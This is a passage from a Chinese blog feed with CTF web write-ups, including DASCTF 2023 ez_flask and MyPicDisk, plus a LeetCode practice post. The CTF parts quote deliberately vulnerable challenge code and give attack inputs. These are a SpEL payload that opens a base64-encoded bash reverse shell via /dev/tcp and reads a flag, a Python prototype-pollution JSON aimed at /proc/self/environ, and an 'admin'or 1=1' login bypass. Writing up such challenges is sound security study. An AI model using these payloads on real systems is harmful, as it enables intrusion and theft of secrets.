&gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 的 base64 编码，注意 IP 须为外网地址，且目标能出网</span><br>T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;bash -c &#123;echo,&#125;|[shell_b64_encode]&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>)<br><span class="hljs-comment">// 读取 flag</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;cat /app/flag.txt&quot;</span>&#125;).start().getInputStream(), <span class="hljs-string">&quot;utf8&quot;</span>)).readLine()<br></code></pre></td></tr></table></figure><p><img src="/img/polarspel2.png" alt="polarspel2"></p><h2 id="backendservice"><a href="#backendservice" class="headerlink" title="backendservice"></a>backendservice</h2>]]></content>
    
    
    
    <tags>
      
      <tag>做题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Leetcode做题记录_2</title>
    <link href="/2024/04/10/2024-4-10-Leetcode%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_2/"/>
    <url>/2024/04/10/2024-4-10-Leetcode%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_2/</url>
    
    <content type="html"><![CDATA[<p>唉，学</p><span id="more"></span><h3 id="最长公共前缀"><a href="#最长公共前缀" class="headerlink" title="最长公共前缀"></a>最长公共前缀</h3><p>编写一个函数来查找字符串数组中的最长公共前缀。</p><p>如果不存在公共前缀，返回空字符串 <code>&quot;&quot;</code>。</p><p><strong>示例 1：</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm">输入：<span class="hljs-keyword">strs</span> = [<span class="hljs-string">&quot;flower&quot;</span>,<span class="hljs-string">&quot;flow&quot;</span>,<span class="hljs-string">&quot;flight&quot;</span>]<br>输出：<span class="hljs-string">&quot;fl&quot;</span><br></code></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm">输入：<span class="hljs-keyword">strs</span> = [<span class="hljs-string">&quot;dog&quot;</span>,<span class="hljs-string">&quot;racecar&quot;</span>,<span class="hljs-string">&quot;car&quot;</span>]<br>输出：<span class="hljs-string">&quot;&quot;</span><br>解释：输入不存在公共前缀。<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">getshuzu</span>(<span class="hljs-params">self</span>):<br>        user_input = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;输入内容，以逗号分隔：&quot;</span>)<br>        input_list = user_input.split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;输入的数组为：<span class="hljs-subst">&#123;input_list&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> input_list<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">findqianzhui</span>(<span class="hljs-params">self,input_list</span>):<br><br>        min_len = <span class="hljs-built_in">min</span>(<span class="hljs-built_in">len</span>(s) <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> input_list)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(min_len):<br>            current_char = input_list[<span class="hljs-number">0</span>][i]<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(s[i] == current_char <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> input_list):<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(input_list[<span class="hljs-number">0</span>][:i])<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>solution = Solution()<br>shuzu = solution.getshuzu()<br>qianzhui = solution.findqianzhui(shuzu)<br></code></pre></td></tr></table></figure><h3 id="有效的括号"><a href="#有效的括号" class="headerlink" title="有效的括号"></a>有效的括号</h3><p>给定一个只包括 <code>&#39;(&#39;</code>，<code>&#39;)&#39;</code>，<code>&#39;&#123;&#39;</code>，<code>&#39;&#125;&#39;</code>，<code>&#39;[&#39;</code>，<code>&#39;]&#39;</code> 的字符串 <code>s</code> ，判断字符串是否有效。</p><p>有效字符串需满足：</p><ol><li>左括号必须用相同类型的右括号闭合。</li><li>左括号必须以正确的顺序闭合。</li><li>每个右括号都有一个对应的相同类型的左括号。</li></ol><p><strong>示例 1：</strong></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nix">输入：<span class="hljs-attr">s</span> = <span class="hljs-string">&quot;()&quot;</span><br>输出：<span class="hljs-literal">true</span><br><br></code></pre></td></tr></table></figure><p>这题没做出来。。想麻烦了，看了别人的解法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">isValid</span>(<span class="hljs-params">self, s</span>):<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            temp = s.replace(<span class="hljs-string">&#x27;()&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;[]&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">if</span> temp == <span class="hljs-string">&#x27;&#x27;</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">elif</span> temp == s:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">else</span>:<br>                s = temp<br></code></pre></td></tr></table></figure><p>思路就是一层一层把括号消掉。我当时想的是遍历s，然后如果<code>(</code>的下一位是<code>)</code>，<code>&#123;</code>的下一位是<code>&#125;</code>等等就直接替换成空。。</p><h3 id="合并两个有序链表"><a href="#合并两个有序链表" class="headerlink" title="合并两个有序链表"></a>合并两个有序链表</h3><p>将两个升序链表合并为一个新的 <strong>升序</strong> 链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7">输入：l1 = <span class="hljs-comment">[1,2,4]</span>, l2 = <span class="hljs-comment">[1,3,4]</span><br>输出：<span class="hljs-comment">[1,1,2,3,4,4]</span><br></code></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7">输入：l1 = <span class="hljs-comment">[]</span>, l2 = <span class="hljs-comment">[]</span><br>输出：<span class="hljs-comment">[]</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">mergeTwoLists</span>(<span class="hljs-params">self, l1: ListNode, l2: ListNode</span>) -&gt; ListNode:<br>        <span class="hljs-keyword">if</span> l1 <span class="hljs-keyword">and</span> l2:<br>            <span class="hljs-keyword">if</span> l1.val &gt; l2.val: l1, l2 = l2, l1<br>            l1.<span class="hljs-built_in">next</span> = self.mergeTwoLists(l1.<span class="hljs-built_in">next</span>, l2)<br>        <span class="hljs-keyword">return</span> l1 <span class="hljs-keyword">or</span> l2<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>做题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>(未完成)DASCTF 2023 &amp; 0X401七月暑期挑战赛_web</title>
    <link href="/2024/03/01/DASCTF-2023-&amp;-0X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B_web/"/>
    <url>/2024/03/01/DASCTF-2023-&amp;-0X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B_web/</url>
    
    <content type="html"><![CDATA[<p>做题记录</p><span id="more"></span><h2 id="ez-flask"><a href="#ez-flask" class="headerlink" title="ez_flask"></a>ez_flask</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, session<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> black_list<br><span class="hljs-keyword">import</span> json<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-built_in">str</span>(uuid.uuid4())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> black_list:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> data:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">user</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.username = <span class="hljs-string">&quot;&quot;</span><br>        self.password = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-keyword">if</span> self.username == data[<span class="hljs-string">&#x27;username&#x27;</span>] <span class="hljs-keyword">and</span> self.password == data[<span class="hljs-string">&#x27;password&#x27;</span>]:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>Users = []<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():<br>    <span class="hljs-keyword">if</span> request.data:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check(request.data):<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Register Failed&quot;</span><br>            data = json.loads(request.data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;password&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Register Failed&quot;</span><br>            User = user()<br>            merge(data, User)<br>            Users.append(User)<br>        <span class="hljs-keyword">except</span> Exception:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Register Failed&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Register Success&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Register Failed&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.data:<br>        <span class="hljs-keyword">try</span>:<br>            data = json.loads(request.data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;password&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Login Failed&quot;</span><br>            <span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> Users:<br>                <span class="hljs-keyword">if</span> user.check(data):<br>                    session[<span class="hljs-string">&quot;username&quot;</span>] = data[<span class="hljs-string">&quot;username&quot;</span>]<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Login Success&quot;</span><br>        <span class="hljs-keyword">except</span> Exception:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Login Failed&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Login Failed&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Login Failed&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">5010</span>)<br></code></pre></td></tr></table></figure><p><a href="https://tttang.com/archive/1876">python原型链污染</a>，<code>/</code>路由存在文件读取功能：</p><p><img src="/img/ez_flask_1.png" alt="ez_flask_1"></p><p>如果不存在黑名单的话直接污染<code>__file__</code>为目标文件就行：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;b&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;__init__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;__globals__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;__file__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/proc/self/environ&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>然后访问<code>/</code>即可，但这题过滤了<code>__init__</code>，有两种方法绕过：</p><p><img src="/img/ez_flaks_3.png" alt="ez_flaks_3"></p><h2 id="MyPicDisk"><a href="#MyPicDisk" class="headerlink" title="MyPicDisk"></a>MyPicDisk</h2><p>万能密码<code>admin&#39;or 1=1</code>直接登录，存在<code>/y0u_cant_find_1t.zip</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FILE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lasttime</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$size</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\//i&quot;</span>, <span class="hljs-variable">$filename</span>))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;hacker!&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;.&quot;</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$num</span> != <span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;hacker!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$filename</span>))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;???&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;filename = <span class="hljs-variable">$filename</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;size = <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;lasttime = <span class="hljs-title function_ invoke__">filemtime</span>(<span class="hljs-variable">$filename</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">remove</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Filename: &quot;</span>. <span class="hljs-variable language_">$this</span>-&gt;filename. <span class="hljs-string">&quot;  Last Modified Time: &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;lasttime. <span class="hljs-string">&quot;  Filesize: &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;size.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls -all &quot;</span>.<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>  &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>  &lt;title&gt;MyPicDisk&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]))&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;form method=&quot;POST&quot;&gt;</span><br><span class="hljs-string">    username：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span><br><span class="hljs-string">    password：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;submit&quot; value=&quot;登录&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&#x27;</span>;<br>  <span class="hljs-variable">$xml</span> = <span class="hljs-title function_ invoke__">simplexml_load_file</span>(<span class="hljs-string">&#x27;/tmp/secret.xml&#x27;</span>);<br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])&#123;<br>    <span class="hljs-variable">$username</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-variable">$x_query</span>=<span class="hljs-string">&quot;/accounts/user[username=&#x27;<span class="hljs-subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="hljs-subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$xml</span>-&gt;<span class="hljs-title function_ invoke__">xpath</span>(<span class="hljs-variable">$x_query</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$result</span>)==<span class="hljs-number">0</span>)&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;登录失败&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;登录成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;<br>    &#125;<br>  &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;<br>    &#125;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) &#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&quot;.&quot;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span>) 